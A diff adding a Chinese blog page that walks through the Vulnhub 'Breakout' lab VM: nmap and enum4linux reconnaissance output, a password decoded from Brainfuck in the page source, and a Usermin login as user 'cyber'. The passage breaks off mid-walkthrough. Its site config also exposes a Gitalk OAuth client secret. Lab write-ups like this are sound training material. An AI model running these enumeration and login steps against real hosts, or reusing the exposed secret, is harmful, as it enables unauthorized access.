@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="seconme">
+    
+    <title>
+        
+            Vulnhub 02 Breakout |
+        
+        ~是我呀
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/favicon.3t5ap34gepy0.webp">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"seconme.github.io","root":"/","language":"zh-CN"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/preview.webp","favicon":"https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/favicon.3t5ap34gepy0.webp","avatar":"https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/preview.1lbmi81cp8u8.webp","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"Lifetime Wandering","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":true},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":"seconme","github_admins":null,"repository":"hexo-blog-comments","client_id":"17efb64209824b16935b","client_secret":"2ceab4677a6e6b5ebd72a6d3207a6611b13b7e95","proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["炼气门徒","筑基弟子","金丹砥柱","元婴长老","化神门主","合道老祖","终于大乘"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/preview.webp">
+                </a>
+            
+            <a class="logo-title" href="/">
+               ~是我呀
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Vulnhub 02 Breakout</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/preview.1lbmi81cp8u8.webp">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">seconme</span>
+                            
+                                <span class="author-label">Lv2</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-05-03 13:00:56</span>
+        <span class="mobile">2023-05-03 13:00</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-05-05 11:27:36</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Vulnhub/">Vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/">靶场实战</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.1k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>14 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="02-Breakout"><a href="#02-Breakout" class="headerlink" title="02 Breakout"></a>02 Breakout</h1><p>打开虚拟机之前，先设置好网络。</p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="1-Webmin-miniServ"><a href="#1-Webmin-miniServ" class="headerlink" title="1. Webmin miniServ"></a>1. Webmin miniServ</h3><p>Webmin 是一个用于管理Linux系统的Web形式的系统管理工具。和我知道的OPNSense防火墙相似，即用Web的可视化远程控制只有命令行的Linux系统。<br>使用教程：</p>
+<h3 id="2-SMB枚举工具：enum4linux"><a href="#2-SMB枚举工具：enum4linux" class="headerlink" title="2. SMB枚举工具：enum4linux"></a>2. SMB枚举工具：enum4linux</h3><p>enum4linux 用于枚举windows和Linux系统上的SMB服务的工具。可以轻松的从与SMB服务有关的目标中快速提取信息。<br>下载：<br>当然kali自带enum4linux。<br>用法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enum4linux ip</span><br><span class="line">enum4linux -a -o ip</span><br></pre></td></tr></table></figure>
+
+<p>:::success<br>总结：</p>
+<ol>
+<li>要仔细搜索信息，搜集漏洞信息利用失败后，要赶紧转换思路，或者早点规划好排查点。<br>:::</li>
+</ol>
+<h2 id="实战开始"><a href="#实战开始" class="headerlink" title="实战开始"></a>实战开始</h2><p>环境：</p>
+<ul>
+<li>kali：192.168.59.128</li>
+<li>Breakout：192.168.59.159</li>
+</ul>
+<h3 id="初步扫描"><a href="#初步扫描" class="headerlink" title="初步扫描"></a>初步扫描</h3><p>测试开始：<br>1、<code>arp-scan -l</code>扫描本地网段，存活主机，发现靶机：192.168.59.159<br><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.nlark.com/yuque/0/2023/png/25772371/1681288512636-f58b7de7-4041-49f7-9c07-c1aae290b280.png#averageHue=%232b2f3a&clientId=u6b54f26b-3ffe-4&from=paste&height=138&id=u96a1a3ef&originHeight=138&originWidth=606&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73432&status=done&style=none&taskId=u2d721925-41a3-48c3-8e87-3fe805ca8c6&title=&width=606"
+                      alt="image.png"
+                ><br>2、使用 nmap 扫描靶机端口开启情况，<code>nmap -sV 192.168.59.159</code>或者直接<code>nmap -A</code><br><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.nlark.com/yuque/0/2023/png/25772371/1681288756168-3f67a3ef-8847-4e0e-9cf0-1009b7afdf0e.png#averageHue=%232f323d&clientId=u49490fc9-f21d-4&from=paste&height=509&id=u2e84c6b9&originHeight=509&originWidth=616&originalType=binary&ratio=1&rotation=0&showTitle=false&size=293165&status=done&style=none&taskId=u542ccbd6-38de-45fc-b3ed-a2bda3531c7&title=&width=616"
+                      alt="image.png"
+                ><br>靶机开启端口80、139、445、10000、20000。<br>其中80端口为web服务，中间件为 Apache2.4.51，并且为debian版本，故该系统应该为Debian。<br>10000和20000端口的服务为 MiniServ（webmin httpd），版本分别为1.981和<strong>1.830</strong>；<br>139、445是我们熟知的Smb服务。其中smb2-security-mode中有句 Message signing enabled but not required，信息签名可用但不必需。<br>靶机NetBOIS名为 BREAKOUT。<br>3、访问 80 端口，是Apache2Debian的默认页面。大概可以推测网站目录结构为：&#x2F;var&#x2F;www&#x2F;html&#x2F;，Apache配置文件目录为：&#x2F;etc&#x2F;apache2&#x2F;。<br><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.nlark.com/yuque/0/2023/png/25772371/1681290170820-a83eb5f9-5b70-4ebd-b6bb-b5f0c2c25a41.png#averageHue=%23d7dfd5&clientId=u49490fc9-f21d-4&from=paste&height=766&id=u93774e0a&originHeight=766&originWidth=808&originalType=binary&ratio=1&rotation=0&showTitle=false&size=187296&status=done&style=none&taskId=u8322345c-bb71-47b3-b4a3-e605abe08cf&title=&width=808"
+                      alt="image.png"
+                ><br>查看页面源码发现：</p>
+<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">don<span class="string">&#x27;t worry no one will get here, it&#x27;</span>s safe <span class="keyword">to</span> share <span class="keyword">with</span> you my access. Its encrypted :)</span><br><span class="line"></span><br><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br></pre></td></tr></table></figure>
+<p>这是个Brainfuck语言。<br>解密：Bugku网站工具里有。<br>解密后：<code>.2uqPEfj3D&lt;P&#39;a-3</code></p>
+<p>4、访问 10000端口，访问 20000端口，一个是webmin登录界面、一个是Usermin登录界面，即一个是管理员一个用户。<br><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.nlark.com/yuque/0/2023/png/25772371/1681290760900-919f6296-8de3-46d6-8580-16b2776ee19f.png#averageHue=%23f5f4e0&clientId=u49490fc9-f21d-4&from=paste&height=415&id=u37d24781&originHeight=415&originWidth=466&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23864&status=done&style=none&taskId=uc1d77f1c-e5c7-4809-af71-bce69247eaf&title=&width=466"
+                      alt="image.png"
+                ><br><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.nlark.com/yuque/0/2023/png/25772371/1681303184424-9c3c6396-3116-4d93-925a-4c575bffc7ed.png#averageHue=%23dbe1d5&clientId=u49490fc9-f21d-4&from=paste&height=419&id=ub1555270&originHeight=419&originWidth=522&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23588&status=done&style=none&taskId=u00ba6954-8f69-4cdb-b3dc-fd1500700c0&title=&width=522"
+                      alt="image.png"
+                ></p>
+<p>5、使用enum4linux扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">sudo enum4linux 192.168.59.159</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Apr 12 08:39:20 2023</span><br><span class="line"></span><br><span class="line"> =========================================( Target Information )=========================================</span><br><span class="line"></span><br><span class="line">Target ........... 192.168.59.159</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===========================( Enumerating Workgroup/Domain on 192.168.59.159 )===========================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===============================( Nbtstat Information <span class="keyword">for</span> 192.168.59.159 )===============================</span><br><span class="line"></span><br><span class="line">Looking up status of 192.168.59.159                                         </span><br><span class="line">        BREAKOUT        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        BREAKOUT        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        BREAKOUT        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ==================================( Session Check on 192.168.59.159 )==================================    </span><br><span class="line">                                                                            </span><br><span class="line">[+] Server 192.168.59.159 allows sessions using username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span>    </span><br><span class="line"></span><br><span class="line"> ===============================( Getting domain SID <span class="keyword">for</span> 192.168.59.159 )===============================                                                </span><br><span class="line">                                                                            </span><br><span class="line">Domain Name: WORKGROUP                                                      </span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line"></span><br><span class="line">[+] Can<span class="string">&#x27;t determine if host is part of domain or part of a workgroup        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ==================================( OS information on 192.168.59.159 )==================================                              </span></span><br><span class="line"><span class="string">[E] Can&#x27;</span>t get OS info with smbclient</span><br><span class="line">                                                                            </span><br><span class="line">[+] Got OS info <span class="keyword">for</span> 192.168.59.159 from srvinfo:                            </span><br><span class="line">        BREAKOUT       Wk Sv PrQ Unx NT SNT Samba 4.13.5-Debian             </span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       6.1</span><br><span class="line">        server <span class="built_in">type</span>     :       0x809a03</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ======================================( Users on 192.168.59.159 )======================================                                                </span><br><span class="line">                                                                            </span><br><span class="line">Use of uninitialized value <span class="variable">$users</span> <span class="keyword">in</span> <span class="built_in">print</span> at ./enum4linux.pl line 972.     </span><br><span class="line">Use of uninitialized value <span class="variable">$users</span> <span class="keyword">in</span> pattern match (m//) at ./enum4linux.pl line 975.</span><br><span class="line"></span><br><span class="line">Use of uninitialized value <span class="variable">$users</span> <span class="keyword">in</span> <span class="built_in">print</span> at ./enum4linux.pl line 986.</span><br><span class="line">Use of uninitialized value <span class="variable">$users</span> <span class="keyword">in</span> pattern match (m//) at ./enum4linux.pl line 988.</span><br><span class="line"></span><br><span class="line"> ================================( Share Enumeration on 192.168.59.159 )================================                                                </span><br><span class="line">                                                                            </span><br><span class="line">smbXcli_negprot_smb1_done: No compatible protocol selected by server.       </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        <span class="built_in">print</span>$          Disk      Printer Drivers</span><br><span class="line">        IPC$            IPC       IPC Service (Samba 4.13.5-Debian)</span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.59.159                              </span><br><span class="line">                                                                            </span><br><span class="line">//192.168.59.159/print$ Mapping: DENIED Listing: N/A Writing: N/A           </span><br><span class="line"></span><br><span class="line">[E] Can<span class="string">&#x27;t understand response:                                            </span></span><br><span class="line"><span class="string">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                  </span></span><br><span class="line"><span class="string">//192.168.59.159/IPC$   Mapping: N/A Listing: N/A Writing: N/A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ===========================( Password Policy Information for 192.168.59.159 )===========================                                               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attaching to 192.168.59.159 using a NULL share</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Trying protocol 139/SMB...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Found domain(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        [+] BREAKOUT</span></span><br><span class="line"><span class="string">        [+] Builtin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Password Info for Domain: BREAKOUT</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        [+] Minimum password length: 5</span></span><br><span class="line"><span class="string">        [+] Password history length: None</span></span><br><span class="line"><span class="string">        [+] Maximum password age: 37 days 6 hours 21 minutes </span></span><br><span class="line"><span class="string">        [+] Password Complexity Flags: 000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                [+] Domain Refuse Password Change: 0</span></span><br><span class="line"><span class="string">                [+] Domain Password Store Cleartext: 0</span></span><br><span class="line"><span class="string">                [+] Domain Password Lockout Admins: 0</span></span><br><span class="line"><span class="string">                [+] Domain Password No Clear Change: 0</span></span><br><span class="line"><span class="string">                [+] Domain Password No Anon Change: 0</span></span><br><span class="line"><span class="string">                [+] Domain Password Complex: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        [+] Minimum password age: None</span></span><br><span class="line"><span class="string">        [+] Reset Account Lockout Counter: 30 minutes </span></span><br><span class="line"><span class="string">        [+] Locked Account Duration: 30 minutes </span></span><br><span class="line"><span class="string">        [+] Account Lockout Threshold: None</span></span><br><span class="line"><span class="string">        [+] Forced Log off Time: 37 days 6 hours 21 minutes </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Retieved partial password policy with rpcclient:                     </span></span><br><span class="line"><span class="string">Password Complexity: Disabled     </span></span><br><span class="line"><span class="string">Minimum Password Length: 5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ======================================( Groups on 192.168.59.159 )======================================                                    </span></span><br><span class="line"><span class="string">[+] Getting builtin groups:          </span></span><br><span class="line"><span class="string">[+]  Getting builtin group memberships:      </span></span><br><span class="line"><span class="string">[+]  Getting local groups:                         </span></span><br><span class="line"><span class="string">[+]  Getting local group memberships:                      </span></span><br><span class="line"><span class="string">[+]  Getting domain groups:                                </span></span><br><span class="line"><span class="string">[+]  Getting domain group memberships:                                      </span></span><br><span class="line"><span class="string"> =================( Users on 192.168.59.159 via RID cycling (RIDS: 500-550,1000-1050) )=================                                                                        </span></span><br><span class="line"><span class="string">[I] Found new SID:  </span></span><br><span class="line"><span class="string">S-1-22-1       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[I] Found new SID:    </span></span><br><span class="line"><span class="string">S-1-5-32                                                                    </span></span><br><span class="line"><span class="string">[I] Found new SID:       </span></span><br><span class="line"><span class="string">S-1-5-32                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[I] Found new SID:                                                          </span></span><br><span class="line"><span class="string">S-1-5-32                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[I] Found new SID:                                                          </span></span><br><span class="line"><span class="string">S-1-5-32                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating users using SID S-1-22-1 and logon username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27; </span></span><br><span class="line"><span class="string">                                                                            </span></span><br><span class="line"><span class="string">S-1-22-1-1000 Unix User\cyber (Local User)                                  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating users using SID S-1-5-32 and logon username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27; </span></span><br><span class="line"><span class="string">                                                                            </span></span><br><span class="line"><span class="string">S-1-5-32-544 BUILTIN\Administrators (Local Group)                           </span></span><br><span class="line"><span class="string">S-1-5-32-545 BUILTIN\Users (Local Group)</span></span><br><span class="line"><span class="string">S-1-5-32-546 BUILTIN\Guests (Local Group)</span></span><br><span class="line"><span class="string">S-1-5-32-547 BUILTIN\Power Users (Local Group)</span></span><br><span class="line"><span class="string">S-1-5-32-548 BUILTIN\Account Operators (Local Group)</span></span><br><span class="line"><span class="string">S-1-5-32-549 BUILTIN\Server Operators (Local Group)</span></span><br><span class="line"><span class="string">S-1-5-32-550 BUILTIN\Print Operators (Local Group)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating users using SID S-1-5-21-1683874020-4104641535-3793993001 and logon username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;                                            </span></span><br><span class="line"><span class="string">                                                                            </span></span><br><span class="line"><span class="string">S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\nobody (Local User)  </span></span><br><span class="line"><span class="string">S-1-5-21-1683874020-4104641535-3793993001-513 BREAKOUT\None (Domain Group)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ==============================( Getting printer info for 192.168.59.159 )==============================                                                </span></span><br><span class="line"><span class="string">                                                                            </span></span><br><span class="line"><span class="string">No printers returned.                                                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">enum4linux complete on Wed Apr 12 08:39:31 2023</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<p>找到用户名：administrator, guest, krbtgt, domain admins, root, bin, none，工作组：WORKGROUP<br>允许会话使用空用户名和空密码；<br>share目录：print$、IPC$<br>发现domain：Breakout、Builtin<br>SID和用户组的对应关系：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-32-544 BUILTIN\Administrators (Local Group)                           </span><br><span class="line">S-1-5-32-545 BUILTIN\Users (Local Group)</span><br><span class="line">S-1-5-32-546 BUILTIN\Guests (Local Group)</span><br><span class="line">S-1-5-32-547 BUILTIN\Power Users (Local Group)</span><br><span class="line">S-1-5-32-548 BUILTIN\Account Operators (Local Group)</span><br><span class="line">S-1-5-32-549 BUILTIN\Server Operators (Local Group)</span><br><span class="line">S-1-5-32-550 BUILTIN\Print Operators (Local Group)</span><br></pre></td></tr></table></figure>
+<p>找到一个用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Enumerating <span class="built_in">users</span> using SID S-1-22-1 and logon username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span> </span><br><span class="line">                                                                            </span><br><span class="line">S-1-22-1-1000 Unix User\cyber (Local User)     </span><br></pre></td></tr></table></figure>
+
+<p>根据前面的信息，有可能用<code>.2uqPEfj3D&lt;P&#39;a-3</code>和上面的用户名进行登录尝试吗？</p>
+<p>6、在20000端口使用 cyber 和 .2uqPEfj3D&lt;P’a-3进行登录。登录成功。<img  
+                     lazyload
+                     alt="image"
